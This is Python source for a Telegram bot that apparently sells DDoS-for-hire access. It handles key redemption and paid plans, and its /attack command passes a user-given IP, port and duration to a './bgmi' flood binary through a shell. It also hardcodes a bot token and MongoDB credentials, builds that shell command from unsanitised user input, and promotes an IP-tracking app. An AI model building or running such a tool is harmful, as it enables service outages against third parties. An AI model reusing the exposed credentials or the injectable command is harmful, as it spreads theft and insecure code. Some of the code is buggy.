import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7487862972:AAEKg6E68y_72RsgfOVjIuvRoxKIxABhh0U'
MONGO_URI = 'mongodb+srv://botplays:botplays@botplays.0xflp.mongodb.net/?retryWrites=true&w=majority&appName=Botplays'
FORWARD_CHANNEL_ID = -1002371337064
CHANNEL_ID = -1002371337064
error_channel_id = -1002371337064

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['botplays']
users_collection = db.users
keys_collection = db["keys"]

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# List of blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime

def check_expired_users():
    now = datetime.now()
    expired_users = users_collection.find({"valid_until": {"$lt": now.isoformat()}})
    
    for user in expired_users:
        user_id = user['user_id']
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}}
        )
        

# Start the scheduler
scheduler = BackgroundScheduler()
scheduler.add_job(check_expired_users, 'interval', minutes=1)  # Run every 1 minute
scheduler.start()

# Ensure the scheduler shuts down cleanly on exit
import atexit
atexit.register(lambda: scheduler.shutdown())

# Track ongoing attacks
ongoing_attacks = {}

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

async def start_asyncio_loop():
    while True:
        now = datetime.now()
        for message_id, (chat_id, target_ip, target_port, duration, end_time, user_id) in list(ongoing_attacks.items()):
            remaining_time = int((end_time - now).total_seconds())
            if remaining_time > 0:
                try:
                    bot.edit_message_reply_markup(
                        chat_id=chat_id,
                        message_id=message_id,
                        reply_markup=create_time_left_button(remaining_time)
                    )
                except Exception as e:
                    logging.error(f"Error updating message: {e}")
            else:
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=f"*✅ Attack Finished! ✅\n\n📡 Host: {target_ip}\n👉 Port: {target_port}*",
                        parse_mode='Markdown',
                        reply_markup=create_inline_keyboard()
                    )
                    forward_attack_finished_message(chat_id, user_id, target_ip, target_port)
                except Exception as e:
                    logging.error(f"Error updating message: {e}")
                ongoing_attacks.pop(message_id, None)
        await asyncio.sleep(1)

async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} ")
    await process.communicate()

    # After the attack finishes, update the message
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text=f"*✅ Attack Finished! ✅*\n"
            f"*The attack on {target_ip}:{target_port}\n For Time <{duration}> has finished successfully.*\n"
            f"*Thank you for using our service!*",
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )

    # Remove the हल्ला  from ongoing attacks
    ongoing_attacks.pop(message_id, None)

def forward_attack_finished_message(chat_id, user_id, target_ip, target_port):
    message = (f"*Forwarded from* [User](tg://user?id={user_id})\n\n"
               f"*✅ Attack Finished! ✅*\n"
               f"*The attack on {target_ip}:{target_port} For Time <{duration}> has finished successfully.*")

    bot.send_message(
        FORWARD_CHANNEL_ID,
        message,
        parse_mode='Markdown'
    )

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def create_inline_keyboard():
    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton(text="OWNER", url="https://t.me/shriram4311")
    keyboard.add(button)
    return keyboard

def create_time_left_button(remaining_time):
    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton(text="Time remaining", callback_data=f"time_remaining_{remaining_time}")
    keyboard.add(button)
    return keyboard

from datetime import datetime

# List of authorized user IDs
AUTHORIZED_USERS = [5123961345]  # Replace with actual admin user IDs

from datetime import datetime, timedelta
import re

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = message.from_user.id

    # Check if user is an admin
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Parse command arguments
    try:
        _, key, duration = message.text.split()
    except ValueError:
        bot.reply_to(message, "Usage: /genkey <key> <duration (e.g. 1h, 30m, 2d)>")
        return

    # Regular expression to match duration
    duration_pattern = re.compile(r"(\d+)([hmld])")
    match = duration_pattern.match(duration)
    if not match:
        bot.reply_to(message, "❌ Invalid duration format. Use 'h' for hours, 'm' for minutes, or 'd' for days.")
        return

    # Extract the number and unit from the duration
    duration_value = int(match.group(1))  # Numeric part (e.g. 1, 30, 2)
    duration_unit = match.group(2).lower()  # Unit part (e.g. 'h', 'm', 'd')

    # Convert the duration into a timedelta
    if duration_unit == 'h':  # hours
        valid_until = datetime.now() + timedelta(hours=duration_value)
    elif duration_unit == 'm':  # minutes
        valid_until = datetime.now() + timedelta(minutes=duration_value)
    elif duration_unit == 'd':  # days
        valid_until = datetime.now() + timedelta(days=duration_value)

    # Check if key already exists
    existing_key = keys_collection.find_one({"key": key})
    if existing_key:
        bot.reply_to(message, "❌ This key already exists. Please use a different key.")
        return

    # Save the key to the database
    keys_collection.insert_one({
        "key": key,
        "valid_until": valid_until.isoformat(),
        "redeemed_by": None
    })

    bot.reply_to(message, f"✅ Key <code>'{key}'</code> generated successfully. Valid until {valid_until.strftime('%Y-%m-%d %H:%M:%S')}.", parse_mode="html")

# /redeem Command
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    try:
        _, key = message.text.split()
    except ValueError:
        bot.reply_to(message, "Usage: /redeem <key>")
        return

    key_data = keys_collection.find_one({"key": key})

    if not key_data:
        bot.reply_to(message, "❌ Invalid key.")
        return

    valid_until = datetime.fromisoformat(key_data['valid_until'])
    now = datetime.now()

    if valid_until < now:
        bot.reply_to(message, "❌ This key has expired.")
        return

    if key_data['redeemed_by'] is not None:
        bot.reply_to(message, "❌ This key has already been redeemed.")
        return

    user_id = message.from_user.id
    keys_collection.update_one({"key": key}, {"$set": {"redeemed_by": user_id}})

    # Update the users_collection to approve the user
    users_collection.update_one(
        {"user_id": user_id},
        {
            "$set": {
                "plan": 1,  # You can customize the plan
                "valid_until": valid_until.isoformat(),
                "access_count": 0,
            }
        },
        upsert=True
    )

    bot.reply_to(message, f"✅ Key redeemed successfully. You now have access until {valid_until.strftime('%Y-%m-%d %H:%M:%S')}.")

# Assuming logging is already set up, if not, add it
logging.basicConfig(level=logging.INFO)

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = message.from_user.id

    # Check if the user is authorized
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Fetch users from the database
    try:
        users = users_collection.find()
        if not users:
            bot.reply_to(message, "No users found in the database.")
            return
    except Exception as e:
        bot.reply_to(message, f"Error fetching users from the database: {e}")
        logging.error(f"Error fetching users: {e}")
        return

    file_content = "Approved Users with Remaining Time:\n\n"
    
    # Process users
    for user in users:
        try:
            user_id = user.get('user_id')
            valid_until = user.get('valid_until')
            plan = user.get('plan', 0)

            if not user_id or not valid_until:
                logging.warning(f"Missing user_id or valid_until for user: {user}")
                continue  # Skip this user if the necessary data is missing

            valid_until_dt = datetime.fromisoformat(valid_until)
            now = datetime.now()

            if valid_until_dt > now:  # Only include users with remaining time
                remaining_time = valid_until_dt - now
                days = remaining_time.days
                hours, remainder = divmod(remaining_time.seconds, 3600)
                minutes, seconds = divmod(remainder, 60)

                if days > 0:
                    remaining_str = f"{days} days"
                elif hours > 0:
                    remaining_str = f"{hours} hours, {minutes} minutes"
                elif minutes > 0:
                    remaining_str = f"{minutes} minutes, {seconds} seconds"
                else:
                    remaining_str = f"{seconds} seconds"

                file_content += f"User ID: {user_id}\n"
                file_content += f"Plan: {plan}\n"
                file_content += f"Remaining Time: {remaining_str}\n\n"
        except Exception as e:
            logging.error(f"Error processing user data: {e}")
            continue  # Skip to the next user if an error occurs

    # If no users to display, send a message instead of a file
    if file_content.strip() == "Approved Users with Remaining Time:":
        bot.reply_to(message, "No users with remaining approval time.")
        return

    # Save to a text file
    file_path = "users.txt"
    try:
        with open(file_path, "w") as file:
            file.write(file_content)

        # Check if the file exists and is not empty
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "Error: File not created or is empty.")
    except Exception as e:
        bot.reply_to(message, f"Error writing or sending the file: {e}")
        logging.error(f"Error writing or sending the file: {e}")
    
@bot.message_handler(commands=['add', 'remove'])
def add_or_remove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /add <user_id> <plan> <duration><unit> or /remove <user_id>.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    duration_with_unit = cmd_parts[3] if len(cmd_parts) >= 4 else None

    if action == '/add':
        if not duration_with_unit:
            bot.send_message(chat_id, "*Please specify the duration with a unit (e.g., 1d, 2h, 30m).*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        # Parse duration and unit
        try:
            duration = int(duration_with_unit[:-1])
            unit = duration_with_unit[-1]
        except ValueError:
            bot.send_message(chat_id, "*Invalid duration format. Use <number><unit>, e.g., 1d, 2h, 30m.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        # Calculate valid_until based on the unit
        now = datetime.now()
        if unit == 'm':
            valid_until = now + timedelta(minutes=duration)
        elif unit == 'h':
            valid_until = now + timedelta(hours=duration)
        elif unit == 'd':
            valid_until = now + timedelta(days=duration)
        else:
            bot.send_message(chat_id, "*Invalid time unit. Use 'm' for minutes, 'h' for hours, or 'd' for days.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        # Approve the user
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until.isoformat(), "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {duration} {unit}.*"
    else:  # remove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown', reply_markup=create_inline_keyboard())
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    # Check if the user is the admin (replace with your actual admin ID)
    if message.from_user.id != 5123961345:
        bot.reply_to(message, "⛔𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙.")
        return

    # Ask for the message to be broadcasted
    msg = bot.reply_to(message, "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙩𝙤 𝙖𝙡𝙡 𝙪𝙨𝙚𝙧𝙨:")

    # Register the next step handler to handle the message content
    bot.register_next_step_handler(msg, send_broadcast)

def send_broadcast(message):
    broadcast_text = message.text
    if not broadcast_text:
        bot.reply_to(message, "𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙖𝙣𝙣𝙤𝙩 𝙗𝙚 𝙚𝙢𝙥𝙩𝙮.")
        return

    # Get all users from the MongoDB 'users' collection
    users = db.users.find()  # Fetch all users from the MongoDB

    for user in users:
        user_id = user['user_id']
        try:
            bot.send_message(user_id, broadcast_text)
        except Exception as e:
            # Log specific error message for chat not found
            if "chat not found" in str(e):
                logging.error(f"Message didn't send to {user_id} as chat not found.")
            else:
                logging.error(f"Failed to send message to {user_id}: {e}")

    # Send confirmation to admin
    bot.reply_to(message, "Message has been broadcasted to all users successfully.")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. \nPlease contact @shriram4311*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 499:
            bot.send_message(chat_id, "*Your Plan 1 💥 is currently not available due to limit reached.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces. \nE.g. - 167.67.25 69696 60*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Error in command\nPlease Press Again your Command*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. \nPlease use a different port.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        end_time = datetime.now() + timedelta(seconds=duration)
        attack_message = bot.send_message(
            message.chat.id,
            f"*❌ Attack started ❌\n\n📡 Host : {target_ip}\n👉 Port : {target_port}*",
            parse_mode='Markdown',
            reply_markup=create_time_left_button(duration)
        )

        # Store the message_id and related details for later update
        ongoing_attacks[attack_message.message_id] = (message.chat.id, target_ip, target_port, duration, end_time, message.from_user.id)

        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(attack_message.message_id, message.chat.id, target_ip, target_port, duration),
            loop
        )
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['info'])
def info_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data:
        username = message.from_user.username
        plan = user_data.get('plan', 'N/A')
        valid_until = user_data.get('valid_until', 'N/A')
        current_time = datetime.now().isoformat()
        response = (f"*👤 USERNAME: @{username}\n"
                    f"💸 Plan: {plan}\n"
                    f"⏳ Valid Until: {valid_until}\n"
                    f"⏰ Current Time: {current_time}*")
    else:
        response = "*No account information found. \nPlease contact @shriram4311*"
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/info` - 👤 Check your account info and stay updated.*\n"
                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
                 "4. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
                 "5. *`/id` - 📜 Get your telegram id. Easy for getting approval.*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['owner'])
def owner_command(message):
    bot.send_message(message.chat.id, "*Owner - @shriram4311*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
                "*Choose your platform:*")

    markup = InlineKeyboardMarkup()  # Ensure you use 'InlineKeyboardMarkup' directly from 'telebot.types'
    button1 = InlineKeyboardButton(
        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
        url="https://t.me/shriram4311")
    button2 = InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error while processing /canary command: {e}")

@bot.message_handler(commands=['id'])
def id_command(message):
    user_id = message.from_user.id
    bot.send_message(message.chat.id, f"Your Telegram ID: `{user_id}`", parse_mode='Markdown')
    
@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_id = message.from_user.id

# List of admin commands
    commands = """
*Admin Commands:*
1. /genkey <key> <duration> - Generate a new key.
2. /redeem <key> - Redeem a key.
3. /users - List all users and their remaining time.
4. /add <user_id> <plan> <duration> - Approve a user.
5. /remove <user_id> - Disapprove a user.
6. /broadcast - Broadcast a message to all users.

For any issues, contact the bot owner.
"""
    bot.send_message(
        message.chat.id,
        commands,
        parse_mode="Markdown",
        reply_markup=create_inline_keyboard()
    )
    

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "*WELCOME! \n\nTo launch an attack, use the /attack command followed by the target host and port.\n\nFor example: After /attack enter IP port duration.\n\nMake sure you have the target in sight before unleashing the chaos!\n\nIf you're new here, check out the /help command to see what else I can do for you.\n\nRemember, with great power comes great responsibility. Use it wisely... or not! 😈*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith('time_remaining_'))
def handle_time_remaining_callback(call):
    remaining_time = int(call.data.split('_')[-1])
    bot.answer_callback_query(call.id, f"Time remaining: {remaining_time} seconds")

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
        
